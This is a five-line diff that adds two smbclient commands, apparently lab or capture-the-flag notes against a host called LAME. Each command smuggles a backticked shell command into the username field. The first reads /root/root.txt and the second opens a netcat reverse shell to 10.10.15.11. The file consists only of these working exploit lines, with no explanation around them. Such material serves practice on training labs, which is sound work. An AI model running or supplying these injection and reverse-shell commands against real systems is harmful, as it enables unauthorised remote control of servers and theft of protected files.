@@ -1,0 +1,5 @@
+smbclient -U "/=\`nohup cat /root/root.txt > /tmp/ttt\`" -N -I 
+10.10.10.3 //LAME/tmp
+
+smbclient -U "/=\`nohup nc -e /bin/sh 10.10.15.11 60000\`" -N -I 
+10.10.10.3 //LAME/tmp
